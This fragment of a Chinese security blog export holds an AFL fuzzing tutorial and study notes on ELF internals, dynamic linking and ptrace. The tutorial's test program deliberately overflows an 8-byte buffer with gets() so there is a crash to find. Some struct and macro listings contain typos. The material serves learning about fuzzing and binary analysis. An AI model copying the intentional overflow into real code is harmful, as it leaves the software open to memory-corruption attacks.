<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">$ tar xvf afl-latest.tgz</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52b</span><br><span class="line">$ make &amp;&amp; make -C llvm_mode CXX=g++</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

<p>可以看到如下提示，afl即安装成功了。</p>
<p><img src="./img/1.png" alt=""></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>接下来我们用一个示例程序来演示afl-fuzz的使用。</p>
<h4 id="有源代码的程序"><a href="#有源代码的程序" class="headerlink" title="有源代码的程序"></a>有源代码的程序</h4><p>首先我们先写一个简单的含有栈溢出漏洞的程序来实验一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="built_in">puts</span>(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们用afl-gcc来编译该程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ afl-gcc -g -o afl_test test.c</span><br></pre></td></tr></table></figure>

<p>然后再在当前目录下创建一个input文件夹，并在里面创建一个文件（文件名也是任意），随便输入点东西：</p>
<p><img src="./img/2.png" alt=""></p>
<p>接着再运行以下指令，就开始正式的fuzzing了（其中-i参数跟随的是输入文件夹，-o跟随的是输出文件夹）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ afl-fuzz -i input -o out afl_test</span><br></pre></td></tr></table></figure>

<p>运行成功后，可以看到如下提示：</p>
<p><img src="./img/3.png" alt=""></p>
<p>然后就会进入到fuzz的运行界面：</p>
<p><img src="./img/4.png" alt=""></p>
<p>其中，overall results框中的cycles done表示运行的总周期数。随着不断fuzzing，周期数会不断增加，其数值的颜色也会由洋红色变成黄色、蓝色、绿色。因为afl-fuzz是一个无限循环运行的，而当cycles done对应数值的颜色变为绿色时，代表可执行内容已经很少了，此时即可用ctrl+c来手动终止fuzzing。</p>
<p>关于其他数值的含义，可以查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方文档</a>。</p>
<p>fuzzing终止后，我们就会在当前目录下得到一个out文件夹：</p>
<p><img src="./img/5.png" alt=""></p>
<p>其中crashes文件夹下的文件即为产生程序crash对应的输入内容，可以用xxd来分析,从而获得漏洞点：</p>
<p><img src="./img/6.png" alt=""></p>
<p>注：</p>
<p>如果运行afl时出现如下错误：</p>
<p><img src="./img/7.png" alt=""></p>
<p>则需要登录root账户执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo core &gt;/proc/sys/kernel/core_pattern</span></span><br></pre></td></tr></table></figure>

<h4 id="无源码程序"><a href="#无源码程序" class="headerlink" title="无源码程序"></a>无源码程序</h4><p>大部分情况下，我们都拿不到程序的源代码，这时候可以加上-Q参数，用qemu模式来运行afl。</p>
<p>我们需要先开启qemu模式：</p>
<p>首先安装下环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install libtool.bin</span><br><span class="line">$ sudo apt-get install automake</span><br><span class="line">$ sudo apt-get install bison</span><br></pre></td></tr></table></figure>

<p>进入原先的afl安装目录，运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure>

<p>如果出现错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">util&#x2F;memfd.c:40:12: error: static declaration of ‘memfd_create’ follows non-static declaration</span><br></pre></td></tr></table></figure>

<p>首先打开build_qemu_support.sh，将这一行注释掉：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make || <span class="built_in">exit</span> 1</span><br></pre></td></tr></table></figure>

<p>然后运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install qemu</span><br><span class="line">$ ./build_qemu_support.sh </span><br><span class="line">$ <span class="built_in">export</span> AFL_PATH=~/tools/afl-2.52b/</span><br></pre></td></tr></table></figure>

<p>就可以成功安装了。（注：这里每次启动shell都得重新添加一次环境变量，可以直接写入~/.bashrc文件末尾。）</p>
<p>然后还是原来的程序，这次我们用gcc编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>然后使用如下命令开始fuzzing：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ afl-fuzz -i input -o out -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>熟悉的界面：</p>
<p><img src="./img/8.png" alt=""></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>小白初学AFL：<a href="https://blog.csdn.net/weixin_39448417/article/details/99703723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39448417/article/details/99703723</a></p>
<p>afl-training：<a href="https://github.com/mykter/afl-training" target="_blank" rel="noopener">https://github.com/mykter/afl-training</a></p>
<p>初探AFL-Fuzz：<a href="https://xz.aliyun.com/t/4314#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4314#toc-8</a></p>
]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>《Linux二进制分析》</title>
    <url>/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Linux环境和相关工具"><a href="#Linux环境和相关工具" class="headerlink" title="Linux环境和相关工具"></a>Linux环境和相关工具</h1><h2 id="Linux工具"><a href="#Linux工具" class="headerlink" title="Linux工具"></a>Linux工具</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><p>GNU调试器</p>
<h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>objdump -D ELF    查看ELF文件中所有节的数据或代码</p>
<p>objdump -d ELF    只查看ELF文件中的程序代码</p>
<p>objdump -tT ELF    查看所有符号</p>
<h3 id="objcopy"><a href="#objcopy" class="headerlink" title="objcopy"></a>objcopy</h3><p>要将.data节从一个ELF目标文件复制到另一个文件中，可以使用下面的指令：</p>
<p>objcopy -only-section=.data &lt;infile&gt; &lt;outfile&gt;</p>
<h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>system call trace是基于ptrace(2)系统调用的一款工具。通过在一个循环中使用PTRACE_SYSCALL请求来显示运行中程序的系统调用活动相关的信息以及程序执行中捕捉到的信号量。</p>
<p>使用strace命令来跟踪一个基本程序：</p>
<p>strace /bin/ls -o ls.out</p>
<p>使用strace命令附加到一个现存的进程上：</p>
<p>strace -p &lt;pid&gt; -o daemon.out</p>
<p>原始输出将会显示每个系统调用的文件描述编号，系统调用会将文件描述符作为参数：SYS_read(3,buf,sizeof(buf))</p>
<p>如果想查看读入到文件描述符3中的所有数据，可以运行下面的命令：</p>
<p>strace -e read=3 /bin/ls</p>
<h3 id="ltrace"><a href="#ltrace" class="headerlink" title="ltrace"></a>ltrace</h3><p>ltrace与strace非常类似。ltrace会解析共享库，并打印出用到的库函数。</p>
<h3 id="ftrace"><a href="#ftrace" class="headerlink" title="ftrace"></a>ftrace</h3><p>与ltrace类似，但还可以显示出二进制文件本身的函数调用。</p>
<p><a href="https://github.com/elfmaster/ftrace" target="_blank" rel="noopener">https://github.com/elfmaster/ftrace</a></p>
<h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><p>-h    查看ELF文件头</p>
<p>-S    查询节表头</p>
<p>-l    查询程序头表</p>
<p>-s    查询符号表</p>
<p>-e    查询ELF文件头数据</p>
<p>-r    查询重定位入口</p>
<p>-d    查询动态段</p>
<h3 id="ERESI"><a href="#ERESI" class="headerlink" title="ERESI"></a>ERESI</h3><p><a href="http://www.eresi-project.org" target="_blank" rel="noopener">http://www.eresi-project.org</a></p>
<h6 id="两篇文章："><a href="#两篇文章：" class="headerlink" title="两篇文章："></a>两篇文章：</h6><p>Cerberus ELF interface（<a href="http://www.phrack.org/archives/issues/61/8.txt）" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/61/8.txt）</a><br>Embedded ELF debugging（<a href="http://www.phrack.org/archives/issues/63/9.txt）" target="_blank" rel="noopener">http://www.phrack.org/archives/issues/63/9.txt）</a></p>
<h3 id="有用的设备和文件"><a href="#有用的设备和文件" class="headerlink" title="有用的设备和文件"></a>有用的设备和文件</h3><h3 id="proc-lt-pid-gt-maps"><a href="#proc-lt-pid-gt-maps" class="headerlink" title="/proc/&lt;pid&gt;/maps"></a>/proc/&lt;pid&gt;/maps</h3><p>该文件保存了一个进程镜像的布局，通过展现每个内存映射来实现，展现的内容包括可执行文件、共享库、栈、堆和VDSO等。</p>
<h3 id="proc-kcore"><a href="#proc-kcore" class="headerlink" title="/proc/kcore"></a>/proc/kcore</h3><p>是Linux内核的动态核心文件，即以ELF核心文件的形式所展现出来的原生内存转储。</p>
<h3 id="boot-System-map"><a href="#boot-System-map" class="headerlink" title="/boot/System.map"></a>/boot/System.map</h3><p>这个文件包含了整个内核的所有符号。</p>
<h3 id="proc-kallsyms"><a href="#proc-kallsyms" class="headerlink" title="/proc/kallsyms"></a>/proc/kallsyms</h3><p>与System.map类似，区别就是kallsyms是内核所属的/proc的一个入口并且可以动态更新。如果安装了新的LKM，符号会自动添加到里面去。</p>
<h3 id="proc-iomem"><a href="#proc-iomem" class="headerlink" title="/proc/iomem"></a>/proc/iomem</h3><p>与/proc/&lt;pid&gt;/maps类似，不过它是跟系统内存相关的。</p>
<h3 id="ECFS"><a href="#ECFS" class="headerlink" title="ECFS"></a>ECFS</h3><p>extended core file snapshot（扩展核心文件快照）是一项特殊的核心转储技术，专门为进程镜像的高级取证分析所设计。</p>
<p> <a href="https://github.com/elfmaster/ecfs" target="_blank" rel="noopener">https://github.com/elfmaster/ecfs</a></p>
<h2 id="链接器相关环境指针"><a href="#链接器相关环境指针" class="headerlink" title="链接器相关环境指针"></a>链接器相关环境指针</h2><h3 id="LD-PRELOAD环境变量"><a href="#LD-PRELOAD环境变量" class="headerlink" title="LD_PRELOAD环境变量"></a>LD_PRELOAD环境变量</h3><p>可以设置成一个指定的库路径，动态链接时可以比其他库有更高的优先级。</p>
<h3 id="LD-SHOW-AUXV环境变量"><a href="#LD-SHOW-AUXV环境变量" class="headerlink" title="LD_SHOW_AUXV环境变量"></a>LD_SHOW_AUXV环境变量</h3><p>能够通知程序加载器来展示程序运行时的辅助向量。</p>
<p>辅助向量是放在程序栈（通过内核的ELF常规加载方式）上的信息，附带了传递给动态链接器的程序相关的特定信息。</p>
<h3 id="链接器脚本"><a href="#链接器脚本" class="headerlink" title="链接器脚本"></a>链接器脚本</h3><p>默认的链接器脚本可以使用ld -verbose查看。</p>
<h1 id="ELF二进制格式"><a href="#ELF二进制格式" class="headerlink" title="ELF二进制格式"></a>ELF二进制格式</h1><h2 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h2><p>ET_NONE：未知类型</p>
<p>ET_REL：重定位文件</p>
<p>ET_EXEC：可执行文件</p>
<p>ET_DYN：共享目标文件</p>
<p>ET_CORE：核心文件</p>
<h2 id="ELF程序头"><a href="#ELF程序头" class="headerlink" title="ELF程序头"></a>ELF程序头</h2><p>Elf32_Phdr结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">unit32_t</span> p_type;<span class="comment">//segment type</span></span><br><span class="line">	Elf32_off p_offset;<span class="comment">//segment offset</span></span><br><span class="line">	Elf32_Addr p_vaddr;<span class="comment">//segment virtual address</span></span><br><span class="line">	Elf32_Addr p_paddr;<span class="comment">//segment physical address</span></span><br><span class="line">	<span class="keyword">uint32_t</span> p_filesz;<span class="comment">//size of segment in file</span></span><br><span class="line">	<span class="keyword">uint32_t</span> p_memsz;<span class="comment">//size of segment in memory</span></span><br><span class="line">	<span class="keyword">uint32_t</span> p_flags;<span class="comment">//segment flags,I.E execute|read|write</span></span><br><span class="line">	<span class="keyword">uint32_t</span> p_align;<span class="comment">//segment alignment in memory</span></span><br><span class="line">&#125;Elf32_Phdr</span><br></pre></td></tr></table></figure>

<h3 id="PT-LOAD"><a href="#PT-LOAD" class="headerlink" title="PT_LOAD"></a>PT_LOAD</h3><p>一个可执行文件至少有一个PT_LOAD类型的段。这类程序头描述的是可装载的段，也就是这种类型的段将被装载或者映射到内存中。</p>
<h3 id="PT-DYNAMIC"><a href="#PT-DYNAMIC" class="headerlink" title="PT_DYNAMIC"></a>PT_DYNAMIC</h3><p>动态段的Phdr。动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容：</p>
<ul>
<li>运行时需要链接的共享库列表；</li>
<li>全局偏移表（GOT）的地址；</li>
<li>重定位条目的相关信息。</li>
</ul>
<p>32位ELF的动态段的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	Elf32_Sword d_tag;</span><br><span class="line">		<span class="keyword">union</span>&#123;</span><br><span class="line">	Elf32_Word d_val;</span><br><span class="line">	Elf32_Addr d_ptr;</span><br><span class="line">		&#125;d_un;</span><br><span class="line">&#125;Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure>

<h3 id="PT-NOTE"><a href="#PT-NOTE" class="headerlink" title="PT_NOTE"></a>PT_NOTE</h3><p>该类型的段可能保存了与特定供应商或者系统相关的附加信息。</p>
<p>NOTE段病毒感染相关信息：<a href="http://vxheavens.com/lib/vhe06.html" target="_blank" rel="noopener">http://vxheavens.com/lib/vhe06.html</a></p>
<h3 id="PT-INTERP"><a href="#PT-INTERP" class="headerlink" title="PT_INTERP"></a>PT_INTERP</h3><p>PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。</p>
<h3 id="PT-PHDR"><a href="#PT-PHDR" class="headerlink" title="PT_PHDR"></a>PT_PHDR</h3><p>该段保存了程序头表本身的位置和大小。Phdr表保存了所有的Phdr堆文件（以及内存镜像）中段的描述信息。</p>
<p>可以用readelf -l <file>命令查看文件的Phdr表</p>
<h2 id="ELF节头"><a href="#ELF节头" class="headerlink" title="ELF节头"></a>ELF节头</h2><h3 id="段和节的区分"><a href="#段和节的区分" class="headerlink" title="段和节的区分"></a>段和节的区分</h3><p>段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。</p>
<h3 id="32位ELF节头的结构："><a href="#32位ELF节头的结构：" class="headerlink" title="32位ELF节头的结构："></a>32位ELF节头的结构：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_name;<span class="comment">//offset into shdr string table for shdr name</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_type;<span class="comment">//shdr type, I.E SHT_PROGBITS</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_flags;<span class="comment">//shdr flags, I.E SHT_WRITE|SHT_ALLOC</span></span><br><span class="line">	Elf32_ADDR sh_addr;<span class="comment">//address of where section begins</span></span><br><span class="line">	Elf32_Off sh_offset;<span class="comment">//offset of shdr from beginning of file</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_size;<span class="comment">//size that section takes up on disk</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_link;<span class="comment">//points to another section</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_info;<span class="comment">//interpretation depends on section type</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_addralign;<span class="comment">//alignment for address of section</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sh_entsize;<span class="comment">//size of each certain entries that may be in section</span></span><br><span class="line">&#125;Elf32_Shdr</span><br></pre></td></tr></table></figure>

<h3 id="text节"><a href="#text节" class="headerlink" title=".text节"></a>.text节</h3><p>该节是保存了程序代码指令的代码节，存在于text段中。此节类型为SHT_PROGBITS</p>
<h3 id="rodata节"><a href="#rodata节" class="headerlink" title=".rodata节"></a>.rodata节</h3><p>该节保存了只读数据。存在于一个可执行文件的只读段中，即只能在text段中找到.rodata节。该节类型为SHT_PROGBITS。</p>
<h3 id="plt节"><a href="#plt节" class="headerlink" title=".plt节"></a>.plt节</h3><p>该节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。存在于text段中。此节类型为SHT_PROGBITS。</p>
<h3 id="data节"><a href="#data节" class="headerlink" title=".data节"></a>.data节</h3><p>.data节存在于data段中，保存了初始化的全局变量等数据。此节类型为SHT_PROGBITS</p>
<h3 id="bss节"><a href="#bss节" class="headerlink" title=".bss节"></a>.bss节</h3><p>保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于为保存实际的数据，此节类型为SHT_NOBITS</p>
<h3 id="got-plt节"><a href="#got-plt节" class="headerlink" title=".got.plt节"></a>.got.plt节</h3><p>.got节保存了全局偏移表。.got.plt节跟程序执行有关，因此节类型被标记为SHT_PROGBITS。</p>
<h3 id="dynsym节"><a href="#dynsym节" class="headerlink" title=".dynsym节"></a>.dynsym节</h3><p>该节保存了从动态共享库导入的动态符号信息，该节保存在text段。节类型为SHT_DYNSYM</p>
<h3 id="dynstr节"><a href="#dynstr节" class="headerlink" title=".dynstr节"></a>.dynstr节</h3><p>该节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代码了符号的名称，以空字符作为终止符。</p>
<h3 id="rel-节"><a href="#rel-节" class="headerlink" title=".rel.*节"></a>.rel.*节</h3><p>重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，堆ELF目标文件的某部分内容或者进程镜像进行补充和修改。节类型为SHT_REL。</p>
<h3 id="hash节"><a href="#hash节" class="headerlink" title=".hash节"></a>.hash节</h3><p>有时也被称为.gnu.hash，保存了一个用于查找符号的散列表。</p>
<h3 id="symtab节"><a href="#symtab节" class="headerlink" title=".symtab节"></a>.symtab节</h3><p>该节保存了ElfN_Sym类型的符号信息。该节类型为SHT_SYMTAB</p>
<h3 id="strtab节"><a href="#strtab节" class="headerlink" title=".strtab节"></a>.strtab节</h3><p>该节保存的是符号字符串表，表中内容会被.symtab的ElfN_Sym结构中的st_name条目引用，此节类型为SHT_STRTAB。</p>
<h3 id="shstrtab节"><a href="#shstrtab节" class="headerlink" title=".shstrtab节"></a>.shstrtab节</h3><p>该节保存节头子符串表，该表是一个以空字符终止的字符串集合，字符串保存了每个节的节名。有一个名为e_shsrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。此节类型为SHT_STRTAB。</p>
<h3 id="ctors和-dtors节"><a href="#ctors和-dtors节" class="headerlink" title=".ctors和.dtors节"></a>.ctors和.dtors节</h3><p>.ctors（构造器）和.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针。（构造函数即main函数执行之前需要执行的代码，析构函数是在main函数之后需要执行的代码。）</p>
<h3 id="ELF文件布局"><a href="#ELF文件布局" class="headerlink" title="ELF文件布局"></a>ELF文件布局</h3><h4 id="text段："><a href="#text段：" class="headerlink" title="text段："></a>text段：</h4><p>[.text]：程序代码。</p>
<p>[.rodata]：只读数据。</p>
<p>[.hash]：符号散列表。</p>
<p>[.dynsym]：共享目标文件符号数据。</p>
<p>[.dynstr]：共享目标文件符号名称。</p>
<p>[.plt]：过程链接表。</p>
<p>[.rel.got]：G.O.T 重定位数据。</p>
<h4 id="data段："><a href="#data段：" class="headerlink" title="data段："></a>data段：</h4><p>[.data]：全局的初始化变量。</p>
<p>[.dynamic]：动态链接结构和对象。</p>
<p>[.got.plt]：全局偏移表。</p>
<p>[.bss]：全局未初始化变量。</p>
<h3 id="ELF符号"><a href="#ELF符号" class="headerlink" title="ELF符号"></a>ELF符号</h3><p>.dynsym保存了引用来自外部文件符号的全局符号。.dynsym保存的符号是.symtab所保存符号的子集，.symtab中还保存了可执行文件的本地符号，如全局变量或者代码中定义的本地函数等。</p>
<p>.dynsym是被标记了ALLOC的，而.symtab则没有被标记。ALLOC表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。</p>
<p>64位ELF文件符号项的结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> st_name;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">	<span class="keyword">uint16_t</span> st_shndx;</span><br><span class="line">	Elf64_Addr st_value;</span><br><span class="line">	Uint64_t st_size;</span><br><span class="line">&#125;Elf64_Sym;</span><br></pre></td></tr></table></figure>

<p>符号项保存在.symtab和.dynsym节中，因此节头项的大小与ElfN_Sym的大小相等。</p>
<h3 id="st-name"><a href="#st-name" class="headerlink" title="st_name"></a>st_name</h3><p>保存了指向符号表中字符串的偏移地址，偏移地址存放着符号的名称。</p>
<h3 id="st-value"><a href="#st-value" class="headerlink" title="st_value"></a>st_value</h3><p>存放符号的值（可能是地址或者位置偏移量）</p>
<h3 id="st-size"><a href="#st-size" class="headerlink" title="st_size"></a>st_size</h3><p>存放了一个符号的大小。</p>
<h3 id="st-other"><a href="#st-other" class="headerlink" title="st_other"></a>st_other</h3><p>定义了符号的可见性。</p>
<h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><p>保存了相关节头表的索引。</p>
<h3 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h3><p>指定符号类型及绑定属性：</p>
<p>1.符号类型：</p>
<p>STT_NOTYPE    符号类型未定义</p>
<p>STT_FUNC    表示该符号与函数或者其他可执行代码关联</p>
<p>STT_OBJECT    表示该符号与数据目标文件关联</p>
<p>2.符号绑定</p>
<p>STB_LOCAL    本地符号在目标文件之外是不可见的</p>
<p>STB_GLOBAL    全局符号对于所有要合并的目标文件来说都是可见的，一个全局符号在一个文件中进行定义后，另一个文件可以对这个符号进行引用。</p>
<p>STB_WEAK    与全局绑定类似，不过比STB_GLOBAL的优先级低。被标记为STB_WEAK的符号有可能被同名的未被标记为STB_WEAK的符号覆盖</p>
<h6 id="对绑定和类型字段进行打包和解包的宏指令"><a href="#对绑定和类型字段进行打包和解包的宏指令" class="headerlink" title="对绑定和类型字段进行打包和解包的宏指令"></a>对绑定和类型字段进行打包和解包的宏指令</h6><p>ELF32_ST_BIND(info)或者ELF64_ST_BIND(info)：从st_info值中提取出一个绑定。</p>
<p>ELF32_ST_TYPE(info)或者ELF64_ST_TYPE(info)：从st_info值中提取类型。</p>
<p>ELF32_ST_TYPE(bind,type)或者ELF64_ST_INFO(bind,type)：将一个绑定和类型转换成st_info值。</p>
<h2 id="ELF重定位"><a href="#ELF重定位" class="headerlink" title="ELF重定位"></a>ELF重定位</h2><p>要将一个偏移量计算成虚拟地址，可以用下面的公式：</p>
<p>address_of_call+offset+sizeof(addr)</p>
<h3 id="基于二进制修补的重定位代码注入"><a href="#基于二进制修补的重定位代码注入" class="headerlink" title="基于二进制修补的重定位代码注入"></a>基于二进制修补的重定位代码注入</h3><p>Eresi（<a href="http://www.eresi-project.org）" target="_blank" rel="noopener">http://www.eresi-project.org）</a></p>
<p>Quenya (<a href="http://www.bitlackeys.org/projects/quenya_32bit.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/quenya_32bit.tgz</a>)</p>
<h2 id="ELF动态链接"><a href="#ELF动态链接" class="headerlink" title="ELF动态链接"></a>ELF动态链接</h2><h3 id="辅助向量"><a href="#辅助向量" class="headerlink" title="辅助向量"></a>辅助向量</h3><p>通过系统调用 sys_execve()将程序加载到内存中时，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特定的对信息的设置和安排即为辅助向量（auxv）。</p>
<p>辅助向量是一系列Elf_auxv_t结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> a_type;</span><br><span class="line">		<span class="keyword">union</span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> a_val;</span><br><span class="line">		&#125;a_un;</span><br><span class="line">&#125;Elf64_auxv_t;</span><br></pre></td></tr></table></figure>

<p>a_type指定了辅助向量的条目类型，a_val为辅助向量的值。</p>
<p>下面是动态链接器所需要的一些最重要的条目类型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_EXECFD	2<span class="comment">//File descriptor of program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PATH		3<span class="comment">//Program headers for program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHENT	4<span class="comment">//Size of program header entry</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHNUM	5<span class="comment">//Number of program headers</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PAGESZ	6<span class="comment">//System page size</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_ENTRY	9<span class="comment">//Entry point of program	</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#deffine AT_UID		11<span class="comment">//Real uid</span></span></span><br></pre></td></tr></table></figure>

<p>程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。</p>
<h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>GOT的前3个偏移量</p>
<p>GOT[0]：存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关信息。</p>
<p>GOT[1]：存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。</p>
<p>GOT[2]：存放了指向动态链接器_dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。</p>
<h3 id="动态段"><a href="#动态段" class="headerlink" title="动态段"></a>动态段</h3><p>动态段保存了一个由类型为ElfN_Dyn的结构体组成的数组：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	Elf32_Sword d_tag;</span><br><span class="line">	<span class="keyword">union</span>&#123;</span><br><span class="line">		Elf32_Word d_val;</span><br><span class="line">		Elf32_Addr d_ptr;</span><br><span class="line">	&#125;d_un;</span><br><span class="line">&#125;Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>d_tag字段保存了类型的定义参数，下面列出常用的比较重要的类型值：</p>
<p>1.DT_NEEDED：保存了所需的共享库名的字符串表偏移量。</p>
<p>2.DT_SYMTAB：动态符号表的地址，对应的节名.dynsym。</p>
<p>3.DT_HASH：符号散列表的地址，对应的节名.hash。</p>
<p>4.DT_STRTAB：符号字符串表的地址，对应的节名.dynstr。</p>
<p>5.DT_PLTGOT：全局偏移表的地址。</p>
<p>d_val成员保存了一个整型值，可以存放各种不同的数据。</p>
<p>d_ptr成员保存了一个内存虚址，可以指向链接器所需要的各种类型的地址。</p>
<p>链接器为每个动态库生成一个link_map结构条目，并将其存入到一个链表中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>&#123;</span></span><br><span class="line">	ElfW(Addr) l_addr;<span class="comment">//Base address shared object is loaded at.</span></span><br><span class="line">	<span class="keyword">char</span> *l_name;<span class="comment">//Absolute file name object was found in.</span></span><br><span class="line">	ElfW(Dyn) *l_ld;<span class="comment">//Dynamic section of the shared object.</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span><span class="comment">//Chain of loaded objects.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编码一个ELF解析器"><a href="#编码一个ELF解析器" class="headerlink" title="编码一个ELF解析器"></a>编码一个ELF解析器</h2><h1 id="Linux进程追踪"><a href="#Linux进程追踪" class="headerlink" title="Linux进程追踪"></a>Linux进程追踪</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p>ptrace可以附加到一个进程上并修改内存。</p>
